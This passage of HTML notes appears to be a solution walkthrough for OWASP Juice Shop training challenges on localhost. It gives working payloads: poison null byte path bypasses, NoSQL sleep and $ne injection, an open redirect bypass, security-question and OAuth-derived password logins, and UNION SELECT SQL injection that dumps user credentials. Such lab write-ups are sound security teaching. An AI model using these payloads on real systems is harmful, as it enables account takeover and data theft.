+</p><p id="af55ac8f-41da-4a28-bbe6-00b6c8ed423a" class="">now you will get a string in this file.</p><p id="042c1481-4f9a-4cd4-9177-f80b50f5d2a9" class=""><code>L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==</code></p><p id="b25de655-3d33-4c21-92b4-cbc2bb918f5f" class="">now we can understand it is base64</p><p id="84435ca5-7ba0-44ae-acb2-d80dbd35c440" class="">once we decode the string you get.</p><p id="1dcf6c99-bbc6-4d37-810c-77cc49056186" class=""><code>/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt</code></p><p id="dc417af3-312c-401e-b6fb-7119fd2a1e81" class="">again you are trapped, here i think ROT13 algorithm is used.</p><p id="7183190c-d2b7-4560-87b6-3dc3aad68425" class="">once we decode it with ROT13</p><p id="808d7196-2663-4607-b925-8ef2cf87e7f7" class="">we get the following.. string lets try this as path</p><p id="73e64b3b-9fb6-449b-80d1-bd68398675f6" class=""><code>/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg</code></p><p id="3f35483b-2424-4728-a181-5c53a36040a8" class="">
+</p><p id="56952700-4b06-4b1b-8a43-d502c063af60" class=""><a href="http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg">http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg</a></p><p id="9bc889af-f1cc-4299-9302-3f2c2e402416" class="">
+</p><p id="a9c5ec5c-f02d-4298-a83b-732b81b0b804" class="">
+</p><h2 id="afa8e95d-ddca-4b0e-a4fe-f208fbd4aa58" class="">6 - Expired Coupon</h2><p id="c2c51fa3-0684-418d-be18-368d53c705a1" class="">Successfully redeem an expired campaign coupon code.</p><p id="8116e516-055b-448b-a272-a8babe4d4cdb" class="">
+</p><p id="3189e8e2-0cc2-4e91-9e78-ecaef3e1f778" class="">
+</p><h2 id="a6cbb2a4-2d89-4932-ad2f-4c2600a06998" class="">7 - Forgotten Developer Backup</h2><p id="b7700d7d-9327-4190-b30a-13beeb9dd765" class="">Access a developer&#x27;s forgotten backup file.</p><p id="3056cf01-d7f5-48b4-a60b-b873a39f00ed" class="">
+</p><ol id="bccd5153-ae32-458c-a283-a588ceb118ad" class="numbered-list" start="1"><li>Browse to<code> http://localhost:3000/ftp </code>(like in Access a confidential document.
+Opening <code>http://localhost:3000/ftp/package.json.bak</code> directly will fail complaining about an <code>illegal file type.</code></li></ol><ol id="29db559a-fd4e-459e-9dc2-086003d4f0ac" class="numbered-list" start="2"><li>Exploiting the parameter like in Access a salesman&#x27;s forgotten backup file will not work here -
+probably because is not a Markdown file.</li></ol><ol id="0edd859c-c3cc-49eb-b7fb-f644b6443d28" class="numbered-list" start="3"><li>Using a <code><em>Poison Null Byte </em></code><code>( %00 )</code> the filter can be tricked, but only with a twist:
+Accessing <code>http://localhost:3000/ftp/package.json.bak%00.md</code> will surprisingly <strong>not </strong>succeed...
+...because the<code> % character needs to be URL-encoded (into %25 )</code> as well in order to work its magic later
+during the file system access.
+<code>http://localhost:3000/ftp/package.json.bak%2500.md </code>will ultimately solve the challenge.</li></ol><p id="ad6a2189-e701-4782-bfb4-f8ef6de5872a" class="">
+</p><h2 id="10e67d91-e863-47d6-8cb0-adb396b75189" class="">8 - Forgotten Sales Backup</h2><p id="34578a18-d7be-4e08-b203-a15e9b1d94c2" class="">Access a salesman&#x27;s forgotten backup file.</p><p id="3146e096-c6f4-4ad5-bdd4-0c0352f30944" class="">1. Use the Poison Null Byte attack described in Access a developer&#x27;s forgotten backup file... </p><p id="cea41743-b60b-456e-af58-f8fce1dda0fd" class="">2. ...to download <code><a href="http://localhost:3000/ftp/coupons_2013.md.bak%2500.md">http://localhost:3000/ftp/coupons_2013.md.bak%00.md</a></code></p><p id="33e97f86-f236-4225-9991-9b62b16a2072" class="">
+</p><p id="58cc1676-5c2c-45c6-9503-cafc5c5e6e98" class="">
+</p><h2 id="ec5e6758-75af-424e-9213-7bbb7e538e47" class="">9 - Login Bjoern</h2><p id="c192248d-0868-4675-b059-8a4fae06aadb" class="">
+</p><p id="8f16ccab-99df-4928-9a26-025264e49383" class="">
+</p><ol id="de8328b0-84ab-41a8-b9dd-87333a20300a" class="numbered-list" start="1"><li>Bjoern has registered via Google OAuth with his (real) account <a href="mailto:bjoern.kimminich@googlemail.com">bjoern.kimminich@googlemail.com</a>.</li></ol><ol id="28e62a60-3059-438f-bdcb-5426cecc4924" class="numbered-list" start="2"><li>Cracking his password hash will probably not work.</li></ol><ol id="f37c67d8-5ca1-4b48-9c78-decbd2cfe6b9" class="numbered-list" start="3"><li>To find out how the OAuth registration and login work, inspect the <code>main.js</code> and search for <code>oauth</code>, which will eventually reveal a function <code>userService.oauthLogin()</code>.</li></ol><ol id="21df1379-3fa4-4ed5-98f2-cdab357b9b37" class="numbered-list" start="4"><li>In the function body you will notice a call to <code>userService.save()</code> - which is used to create a user account in the non-Google <em>User Registration</em> process - followed by a call to the regular <code>userService.login()</code></li></ol><ol id="49ffa8c8-7072-45b0-8ba4-d05be29e7186" class="numbered-list" start="5"><li>The <code>save()</code> and <code>login()</code> function calls both leak how the password for the account is set: <code>password: btoa(n.email.split(&quot;&quot;).reverse().join(&quot;&quot;))</code></li></ol><ol id="b56bea24-b073-4d7c-b55b-e7b14897ac6c" class="numbered-list" start="6"><li>Some Internet search will reveal that <code>window.btoa()</code> is a default function to encode strings into Base64.</li></ol><ol id="6686001a-f4b0-4f3d-816d-fbd1e87679f4" class="numbered-list" start="7"><li>What is passed into <code>btoa()</code> is <code>email.split(&quot;&quot;).reverse().join(&quot;&quot;)</code>, which is simply the email address string reversed.</li></ol><ol id="16e748bc-4466-413a-bda8-47c366a1cce1" class="numbered-list" start="8"><li>Now all you have to do is Base64-encode <code>moc.liamg@hcinimmik.nreojb</code>, so you can log in directly with <em>Email</em> <code>bjoern.kimminich@gmail.com</code> and <em>Password</em> <code>bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=</code>.</li></ol><p id="f1e4f0d4-27b6-4ced-a24c-7804c9122f70" class="">
+</p><p id="d744efc7-4c62-481b-8e4a-03df2e1845b8" class="">
+</p><h2 id="111982df-e973-47b8-8fa9-877d8e1788d0" class="">10 - GDPR Data Theft</h2><p id="4b7672db-5f85-4639-957c-66be722473bd" class="">Steal someone else&#x27;s personal data without using Injection.</p><p id="623b86d2-5396-4a15-a135-dafcda35c9b8" class="">
+</p><ol id="edbaf1f9-28fa-4424-a8bf-68940377b35a" class="numbered-list" start="1"><li>Log in as any user, put some items into your basket and create an order from these.</li></ol><ol id="94c562a7-eb63-48d0-880c-5fc433440e8b" class="numbered-list" start="2"><li>Copy the order ID from the confirmation PDF. It should look similar to <code>5267-829f123593e9d098</code> in its format.</li></ol><ol id="096c20d8-cc12-486e-a601-3db98d7cb04f" class="numbered-list" start="3"><li>Visit <a href="http://localhost:3000/#/track-order">http://localhost:3000/#/track-order</a>, paste in your <em>Order ID</em> and then click <em>Track</em>.</li></ol><ol id="d0425274-2b8b-4db1-9a4f-174df22a9529" class="numbered-list" start="4"><li>In the network tab of your browser you should find a request similar to <a href="http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3">http://localhost:3000/rest/track-order/7962-6e31e50a0c6f2ea3</a>.</li></ol><ol id="255833e8-d604-4721-9868-59e0aed8b893" class="numbered-list" start="5"><li>Inspecting the response closely, you might notice that the user email address is partially obfuscated: <code>{&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:[{&quot;orderId&quot;:&quot;5267-829f123593e9d098&quot;,</code><mark class="highlight-teal"><strong><code>&quot;email&quot;:&quot;*dm*n@j**c*-sh.*p&quot;</code></strong></mark><code>,&quot;totalPrice&quot;:2.88,&quot;products&quot;:[{&quot;quantity&quot;:1,&quot;name&quot;:&quot;Apple Juice (1000ml)&quot;,&quot;price&quot;:1.99,&quot;total&quot;:1.99,&quot;bonus&quot;:0},{&quot;quantity&quot;:1,&quot;name&quot;:&quot;Apple Pomace&quot;,&quot;price&quot;:0.89,&quot;total&quot;:0.89,&quot;bonus&quot;:0}],&quot;bonus&quot;:0,&quot;eta&quot;:&quot;2&quot;,&quot;_id&quot;:&quot;tosmfPsDaWcEnzRr3&quot;}]}</code></li></ol><ol id="f25ef9c6-4dcf-4d81-8423-3b9d6fa6437f" class="numbered-list" start="6"><li>It looks like certain letters - seemingly all vowels - were replaced with <code>*</code> characters before the order was stored in the database.</li></ol><ol id="996b45bf-75a0-4e96-82c9-3b8e94c44a8c" class="numbered-list" start="7"><li>Register a new user with an email address that would result in <em>the exact same</em> obfuscated email address. For example register <code>edmin@juice-sh.op</code> to steal the data of <code>admin@juice-sh.op</code>.</li></ol><ol id="d4cdf271-99cb-45df-a8a7-1c275ede2cd3" class="numbered-list" start="8"><li>Log in with your new user and immediately get your data exported via <a href="http://localhost:3000/#/privacy-security/data-export">http://localhost:3000/#/privacy-security/data-export</a>.</li></ol><ol id="a248932d-1874-499c-a4ac-32c8646d17d1" class="numbered-list" start="9"><li>You will notice that the order belonging to the existing user <code>admin@juice-sh.op</code> (in this example <code>5267-829f123593e9d098</code>) is part of your new user&#x27;s data export due to the clash when obfuscating emails!</li></ol><p id="1d2ddcea-eb7c-4abf-9ab5-9a4c91356bba" class="">
+</p><p id="920b354c-bfa4-4406-98aa-b7873befaaea" class="">
+</p><h2 id="10b65c10-00ac-4368-8957-d3072d2a942d" class="">11 - Misplaced Signature File</h2><p id="18c82b59-6e2e-4cda-b714-4240698dab4f" class="">Access a misplaced SIEM signature file.</p><p id="5948279e-0434-4398-a383-ad6441390247" class="">
+</p><ol id="52f6d5a4-aaae-4bc6-a731-c753acb64575" class="numbered-list" start="1"><li>Use the <em>Poison Null Byte</em> attack described in Access a developer&#x27;s forgotten backup file...</li></ol><ol id="1308e2f4-139b-4c20-a097-8e103b16fe72" class="numbered-list" start="2"><li>...to download <a href="http://localhost:3000/ftp/suspicious_errors.yml%2500.md">http://localhost:3000/ftp/suspicious_errors.yml%2500.md</a></li></ol><p id="f4a19780-120d-4e55-b280-e1092751fa01" class="">
+</p><h2 id="09354249-9b21-4e17-a674-4c378140f138" class="">12 - NoSQL DoS</h2><p id="4a3a9d89-8f40-49aa-96c3-9241c23bdbb9" class="">Let the server sleep for some time. (It has done more than enough hard work for you)</p><p id="9399a05d-c650-4c85-8240-e82bc45cfc17" class="">
+</p><ol id="2028ce6b-e1a1-4b1c-9c0d-7ad0ea000f5a" class="numbered-list" start="1"><li>You can interact with the backend API for product reviews via the dedicated endpoints <code>/rest/products/reviews</code> and <code>/rest/products/{id}/reviews</code></li></ol><ol id="c94137a3-12c4-4490-961f-98c420f2c607" class="numbered-list" start="2"><li>Get the reviews of the product with database ID 1: <a href="http://localhost:3000/rest/products/1/reviews">http://localhost:3000/rest/products/1/reviews</a></li></ol><ol id="992fa982-3a73-4558-bfb1-3780cbc37ddd" class="numbered-list" start="3"><li>Inject a <a href="https://docs.mongodb.com/manual/reference/method/sleep/"><code>sleep(integer ms)</code></a><a href="https://docs.mongodb.com/manual/reference/method/sleep/"> command</a> by changing the URL into <a href="http://localhost:3000/rest/products/sleep(2000)/reviews">http://localhost:3000/rest/products/sleep(2000)/reviews</a> to solve the challenge</li></ol><p id="0ac60bf1-596f-4597-9f70-753833abb65d" class="">To avoid <em>real</em> Denial-of-Service (DoS) issues, the Juice Shop will only wait for a maximum of 2 seconds, so <a href="http://localhost:3000/rest/products/sleep(999999)/reviews">http://localhost:3000/rest/products/sleep(999999)/reviews</a> should not take longer than <a href="http://localhost:3000/rest/products/sleep(2000)/reviews">http://localhost:3000/rest/products/sleep(2000)/reviews</a> to respond.</p><p id="66d45897-04f4-49ac-851e-744d355e7f14" class="">
+</p><h2 id="1290acdb-2d4d-4d45-b129-acda624989dc" class="">13 - NoSQL Manipulation</h2><p id="eef0726e-0f99-4664-bf6e-d18e4105c4b2" class="">Update multiple product reviews at the same time.</p><p id="3845ea51-c7c0-4cd0-a667-ad12af5b19e6" class="">orignal Request URL :-  PUT <a href="http://localhost:3000/rest/products/24/reviews">http://localhost:3000/rest/products/24/reviews</a></p><p id="14d5ab94-71bc-4548-b5e7-d159152ba820" class="">manipulated Request URL :- PATCH <a href="http://localhost:3000/rest/products/24/reviews">http://localhost:3000/rest/products/reviews</a></p><p id="7734a522-8c62-4bcf-a99a-9edd265061d9" class=""><code>{ &quot;id&quot;: { &quot;$ne&quot;: -1 }, &quot;message&quot;: &quot;NoSQL Injection!&quot; }</code> as a body</p><p id="0e2abf86-e88d-4098-9d8c-bbe80a9aa9ec" class="">
+</p><ul id="6f0d3ba9-4f6d-4976-a168-9b2e99b1de96" class="bulleted-list"><li>as <code>Content-Type</code> header.</li></ul><ul id="0c158b38-6579-43da-912c-5730afb579d7" class="bulleted-list"><li>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with the token</li></ul><p id="7e87c837-ed35-4f5f-a116-e513dfd1c7d6" class="">Check different product detail dialogs to verify that all review texts have been changed into NoSQL Injection!</p><p id="295f4fbf-f216-4e04-be4d-8b2efc1575f3" class="">
+</p><h2 id="ca527921-6106-49cf-9965-a946f101da8b" class="">14 -Whitelist Bypass - Unvalidated Redirects</h2><p id="891851f4-d3fa-48b0-9180-1bf2be753cb4" class="">Enforce a redirect to a page you are not supposed to redirect to.</p><p id="b1889c6b-d02f-481e-b9b1-68a076ae9f0a" class="">
+</p><p id="35a9b340-2f53-4e08-891b-3ba08361537e" class="">
+</p><ol id="87f89a62-a492-4dbe-8b98-e64bfbbc81e5" class="numbered-list" start="1"><li>Pick one of the redirect links in the application, e.g. <a href="http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop">http://localhost:3000/redirect?to=https://github.com/bkimminich/juice-shop</a> from the <em>GitHub</em>-button in the navigation bar.</li></ol><ol id="691fd497-31d7-4c87-90e6-f898b63f25ed" class="numbered-list" start="2"><li>Trying to redirect to some unrecognized URL fails due to whitelist validation with <code>406 Error: Unrecognized target URL for redirect</code>.</li></ol><ol id="78be3947-0302-4e6e-a3bb-b1ae166dd465" class="numbered-list" start="3"><li>Removing the <code>to</code> parameter (<a href="http://localhost:3000/redirect">http://localhost:3000/redirect</a>) will instead yield a <code>500 TypeError: Cannot read property &#x27;indexOf&#x27; of undefined</code> where the <code>indexOf</code> indicates a severe flaw in the way the whitelist works.</li></ol><ol id="754831cd-df0e-4c66-b0bc-b365b97e205f" class="numbered-list" start="4"><li>Craft a redirect URL so that the target-URL in <code>to</code> comes with an own parameter containing a URL from the whitelist, e.g. <a href="http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop">http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop</a></li></ol><p id="23059817-a796-44ba-a8e1-135d91ec2ca7" class="">
+</p><h2 id="abff6821-1b9d-45d6-949a-1f0389a8f6e5" class="">15 - Reset Bender&#x27;s Password</h2><p id="10e8cc7d-2bcb-4b27-9f1c-ef4512d70f32" class="">Reset Bender&#x27;s password via the Forgot Password mechanism with the original answer to his security question.</p><p id="cfe65776-5d5c-49f5-b23b-dd3262983472" class="">
+</p><p id="896ff716-e9bb-429c-9c3e-27283925ddda" class="">
+</p><ol id="0791104f-5bd8-4362-bf30-cfe321677681" class="numbered-list" start="1"><li>Trying to find out who &quot;Bender&quot; might be should <em>immediately</em> lead you to <em>Bender from </em><a href="http://www.imdb.com/title/tt0149460/"><em>Futurama</em></a> as the only viable option<p id="f524ccf0-0897-4d06-8ae6-44c557e676f9" class="">+</p><figure id="fc4344e3-ef8a-4e20-abbf-791d0987dbea" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Bender_Rodriguez.png"><img style="width:144px" src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/Bender_Rodriguez.png"/></a></figure></li></ol><ol id="2b1dc8a8-8904-4dbc-8088-dface953d08a" class="numbered-list" start="2"><li>Visit <a href="https://en.wikipedia.org/wiki/Bender_(Futurama">https://en.wikipedia.org/wiki/Bender_(Futurama</a>) and read the <em>Character Biography</em> section</li></ol><ol id="ec6564dd-2bd6-45af-8765-55a93fbd8db6" class="numbered-list" start="3"><li>It tells you that Bender had a job at the metalworking factory, bending steel girders for the construction of <em>suicide booths</em>.</li></ol><ol id="e52b4c93-4a72-4929-8455-7a07badd4b70" class="numbered-list" start="4"><li>Find out more on <em>Suicide Booths</em> on <a href="http://futurama.wikia.com/wiki/Suicide_booth">http://futurama.wikia.com/wiki/Suicide_booth</a></li></ol><ol id="786bc971-c985-4e51-88ba-b46815178d3a" class="numbered-list" start="5"><li>This site tells you that their most important brand is <em>Stop&#x27;n&#x27;Drop</em></li></ol><ol id="0f0c6e1c-20b1-443c-b8e8-dd728a603268" class="numbered-list" start="6"><li>Visit <a href="http://localhost:3000/#/forgot-password">http://localhost:3000/#/forgot-password</a> and provide <code>bender@juice-sh.op</code> as your <em>Email</em></li></ol><ol id="2924856c-ae81-4d93-ad5d-7e4932d8e1c9" class="numbered-list" start="7"><li>In the subsequently appearing form, provide <code>Stop&#x27;n&#x27;Drop</code> as <em>Company you first work for as an adult?</em></li></ol><ol id="af576459-7284-4717-a730-634acdb71b3d" class="numbered-list" start="8"><li>Then type any <em>New Password</em> and matching <em>Repeat New Password</em></li></ol><ol id="c82a4b24-a14a-48d6-9fd3-e15b49e530a5" class="numbered-list" start="9"><li>Click <em>Change</em> to solve this challenge</li></ol><p id="65b22d3d-dfe0-48bb-bd4f-c629258140c2" class="">
+</p><h2 id="2ccf7045-36c6-4ddb-a620-6e2e2259b490" class="">16 - Steganography</h2><p id="7a4e26e4-5b49-46b4-b0ea-923236290ff2" class="">Rat out a notorious character hiding in plain sight in the shop. (Mention the exact name of the character)</p><p id="d340af49-9c92-42b8-8b7f-66a6922dbc15" class="">Security through Obscurity</p><p id="6e28c33c-89eb-4b34-8979-30ad6f12aa32" class="">
+</p><p id="4589ad23-4de7-4358-b63a-ac1c78519742" class="">
+</p><ol id="aa3f417c-3141-44c2-b11b-2ced97aa9526" class="numbered-list" start="1"><li>Looking for irregularities among the image files you will at some point notice that <code>5.png</code> is the only PNG file among otherwise only JPGs in the customer feedback carousel:<figure id="625d5041-67b6-431d-8bba-9c9e98f4039b" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography.png"><img style="width:240px" src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography.png"/></a></figure></li></ol><ol id="344ebed0-dc9e-471b-ab5a-118ba31f0b63" class="numbered-list" start="2"><li>Running this image through some decoders available online will probably just return garbage, e.g. <a href="http://stylesuxx.github.io/steganography/">http://stylesuxx.github.io/steganography/</a> gives you <code>ÿÁÿm¶Û$–ÿ ?HÕPü^‡ÛN&#x27;c±UY‰;fä’HÜmÉ#r&lt;v¸</code> or <a href="https://www.mobilefish.com/services/steganography/steganography.php">https://www.mobilefish.com/services/steganography/steganography.php</a> gives up with <code>No hidden message or file found in the image</code>. On <a href="https://incoherency.co.uk/image-steganography/#unhide">https://incoherency.co.uk/image-steganography/#unhide</a> you will also find nothing independent of how you set the <em>Hidden bits</em> slider:</li></ol><ol id="7e1ccd20-05b1-42cf-aefb-11ef71cf01ba" class="numbered-list" start="3"><li>Moving on to client applications you might end up with <a href="https://www.openstego.com/">OpenStego</a> which is built in Java but also offers a Windows installer at <a href="https://github.com/syvaidya/openstego/releases">https://github.com/syvaidya/openstego/releases</a>.</li></ol><ol id="ae9fb950-86cb-4497-947a-e1fb3344a6c6" class="numbered-list" start="4"><li>Selecting the <code>5.png</code> and clicking <em>Extract Data</em> OpenStego will quickly claim to have been successful:<figure id="7653220f-a78d-4751-ba0f-96eb29632da2" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_openstego-success.png"><img style="width:384px" src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_openstego-success.png"/></a></figure></li></ol><ol id="d809eeae-c8d9-4c8b-9caa-0b0f6685b8da" class="numbered-list" start="5"><li>The image that will be put into the <em>Output Stego file</em> location clearly depicts a pixelated version of <a href="https://en.wikipedia.org/wiki/Pickle_Rick">Pickle Rick</a> (from S3E3 - one of the best <a href="https://en.wikipedia.org/wiki/Rick_and_Morty">Rick &amp; Morty</a> episodes ever)<figure id="545540c2-8f62-460f-a25f-9d4797625fb1" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_pickle-rick.png"><img style="width:288px" src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/steganography_pickle-rick.png"/></a></figure></li></ol><ol id="53cc11a0-0421-436b-b99e-7a710ec44633" class="numbered-list" start="6"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a></li></ol><ol id="5e52185f-7e34-4b23-8592-2c7c620fe32f" class="numbered-list" start="7"><li>Submit your feedback containing the name <code>Pickle Rick</code> (case doesn&#x27;t matter) to solve this challenge.</li></ol><p id="96a329d1-024a-4c97-ab20-5b7ab05dc3a3" class="">
+</p><h2 id="048abf8d-3d95-491a-bbdb-19c31aa2ef21" class="">17 - Legacy Typosquatting (Vulnerable Components)</h2><p id="dd7c9565-5834-4c5c-91f2-ef52d1da890d" class="">Inform the shop about a typosquatting trick it has been a victim of at least in v6.2.0-SNAPSHOT. (Mention the exact name of the culprit)</p><p id="0b1a5cf8-f027-4ff4-bb96-6799b4b4c168" class="">
+</p><ol id="eb09de46-3257-443b-a187-2c4e76756ad8" class="numbered-list" start="1"><li>Solve the <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#access-a-developers-forgotten-backup-file">Access a developer&#x27;s forgotten backup file</a> challenge and open the <code>package.json.bak</code> file</li></ol><ol id="e9be80cd-0a8c-4b13-a106-b9478857617c" class="numbered-list" start="2"><li>Scrutinizing each entry in the <code>dependencies</code> list you will at some point get to <code>epilogue-js</code>, the overview page of which gives away that you find the culprit at <a href="https://www.npmjs.com/package/epilogue-js">https://www.npmjs.com/package/epilogue-js</a><figure id="0a14171e-c592-4c22-88da-4be79c8cbcc1" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue-js.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue-js.png"/></a></figure><p id="8fdc5f0f-2021-40df-84ea-cfcd1e858b61" class="">
+</p></li></ol><ol id="7828e7b1-dbf9-440e-950f-33aef8ae5fe3" class="numbered-list" start="3"><li>Visit <a href="http://localhost:3000/#/contact">http://localhost:3000/#/contact</a></li></ol><ol id="d65fb340-ab2b-48d5-afe5-2af3540b6938" class="numbered-list" start="4"><li>Submit your feedback with <code>epilogue-js</code> in the comment to solve this challenge</li></ol><p id="afa9842a-d812-46a7-aa41-33ecdef99f24" class="">You can probably imagine that the typosquatted <code>epilogue-js</code> would be <em>a lot harder</em> to distinguish from the original repository <code>epilogue</code>, if it where not marked with the <em>THIS IS </em><em><strong>NOT</strong></em><em> THE MODULE YOU ARE LOOKING FOR!</em>-warning at the very top. Below you can see the original <code>epilogue</code> NPM page:</p><figure id="67c7e272-f85d-45eb-982d-1ef003c05fca" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/npm_epilogue.png"/></a></figure><p id="94f8d00e-efdb-45a3-aefe-79054bbd1533" class="">
+</p><p id="711b4b18-c47a-46f2-a09f-103c583d62bb" class="">
+</p><h2 id="95e6dfdf-c034-41bb-87cb-a136efcd506c" class="">18 -User Credentials (Retrieve a list of all user credentials via SQL Injection.)</h2><p id="fd508d77-f8f8-410f-a4ca-611a63a333dd" class="">
+</p><p id="06f98333-366d-4fca-87fd-796a08b6dec6" class="">
+</p><ol id="5e7d3981-7b43-4a51-9b27-0ab492682586" class="numbered-list" start="1"><li>During the <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#order-the-christmas-special-offer-of-2014">Order the Christmas special offer of 2014</a> challenge you learned that the <code>/rest/products/search</code> endpoint is susceptible to SQL Injection into the <code>q</code> parameter.</li></ol><ol id="af8b537e-5244-4265-9b93-be0c83ff9a16" class="numbered-list" start="2"><li>The attack payload you need to craft is a <code>UNION SELECT</code> merging the data from the user&#x27;s DB table into the products returned in the JSON result.</li></ol><ol id="5955193a-ccc9-4892-8f51-e419426ad5b6" class="numbered-list" start="3"><li>As a starting point we use the known working <code>&#x27;))--</code> attack pattern and try to make a <code>UNION SELECT</code> out of it</li></ol><ol id="04a5b8d8-aea0-4198-9f49-4702c98ce01f" class="numbered-list" start="4"><li>Searching for <code>&#x27;)) UNION SELECT * FROM x--</code> fails with a <code>SQLITE_ERROR: no such table: x</code> as you would expect. But we can easily guess the table name or infer it from one of the previous attacks on the <em>Login</em> form where even the underlying SQL query was leaked.</li></ol><ol id="f557dcf4-fc43-4665-b39e-2b47dc0d02bf" class="numbered-list" start="5"><li>Searching for <code>&#x27;)) UNION SELECT * FROM Users--</code> fails with a promising <code>SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns</code> which least confirms the table name.</li></ol><ol id="77e7526a-5617-4f0d-9127-6e6ec9c6282e" class="numbered-list" start="6"><li>The next step in a <code>UNION SELECT</code>-attack is typically to find the right number of returned columns. As the <em>Search Results</em> table in the UI has 3 columns displaying data, it will probably at least be three. You keep adding columns until no more <code>SQLITE_ERROR</code> occurs (or at least it becomes a different one):<ol id="8b556fc1-ad17-460c-8753-8a376e917030" class="numbered-list" start="1"><li><code>&#x27;)) UNION SELECT &#x27;1&#x27; FROM Users--</code> fails with <code>number of result columns</code> error</li></ol><ol id="6411a253-9f77-43cd-8537-95c3e33f7aad" class="numbered-list" start="2"><li><code>&#x27;)) UNION SELECT &#x27;1&#x27;, &#x27;2&#x27; FROM Users--</code> fails with <code>number of result columns</code> error</li></ol><ol id="ca8d04d3-cfde-4492-a563-f5605a31e5cc" class="numbered-list" start="3"><li><code>&#x27;)) UNION SELECT &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27; FROM Users--</code> fails with <code>number of result columns</code> error</li></ol><ol id="c8d7d8f6-e519-4bf7-bb4d-389e4df5b923" class="numbered-list" start="4"><li>(...)</li></ol><ol id="41aa1336-620c-440f-b5ee-3b5663c16e3c" class="numbered-list" start="5"><li><code>&#x27;)) UNION SELECT &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27; FROM Users--</code> <em>still fails</em> with <code>number of result columns</code> error</li></ol><ol id="4a068766-e472-4187-ad09-b0047621c68b" class="numbered-list" start="6"><li><code>&#x27;)) UNION SELECT &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27; FROM Users--</code> finally gives you a JSON response back with an extra element <code>{&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;2&quot;,&quot;description&quot;:&quot;3&quot;,&quot;price&quot;:&quot;4&quot;,&quot;deluxePrice&quot;:&quot;5&quot;,&quot;image&quot;:&quot;6&quot;,&quot;createdAt&quot;:&quot;7&quot;,&quot;updatedAt&quot;:&quot;8&quot;,&quot;deletedAt&quot;:&quot;9&quot;}</code>.</li></ol></li></ol><ol id="0a557175-f4cc-4e65-97d9-74c5e2bdd7e9" class="numbered-list" start="7"><li>Next you get rid of the unwanted product results changing the query into something like <code>qwert&#x27;)) UNION SELECT &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27; FROM Users--</code> leaving only the &quot;<code>UNION</code>ed&quot; element in the result set</li></ol><ol id="e45fcdb7-0bc7-4b3c-b259-614d2ad835f9" class="numbered-list" start="8"><li>The last step is to replace the fixed values with correct column names. You could guess those <strong>or</strong> derive them from the RESTful API results <strong>or</strong> remember them from previously seen SQL errors while attacking the <em>Login</em> form.</li></ol><ol id="bfb05168-ab6b-4900-95a0-4c7e406c4903" class="numbered-list" start="9"><li>Searching for <code>qwert&#x27;)) UNION SELECT id, email, password, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27; FROM Users--</code> solves the challenge giving you a the list of all user data in convenient JSON format.<figure id="268246fd-e197-4c1c-8742-c980b867ff17" class="image"><a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/union_select-attack_result.png"><img src="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/img/union_select-attack_result.png"/></a></figure></li></ol><p id="bd4db88f-50c8-46a3-ab98-5099e37ddf95" class="">There is of course a much easier way to retrieve a list of all users as long as you are logged in: Open <a href="http://localhost:3000/#/administration">http://localhost:3000/#/administration</a> while monitoring the HTTP calls in your browser&#x27;s developer tools. The response to <a href="http://localhost:3000/rest/user/authentication-details">http://localhost:3000/rest/user/authentication-details</a> also contains the user data in JSON format. But: This list has all the password hashes replaced with <code>*</code>-symbols, so it does not count as a solution for this challenge.</p><p id="cf4f7cb7-5765-4cc8-8408-23289ad6d736" class="">
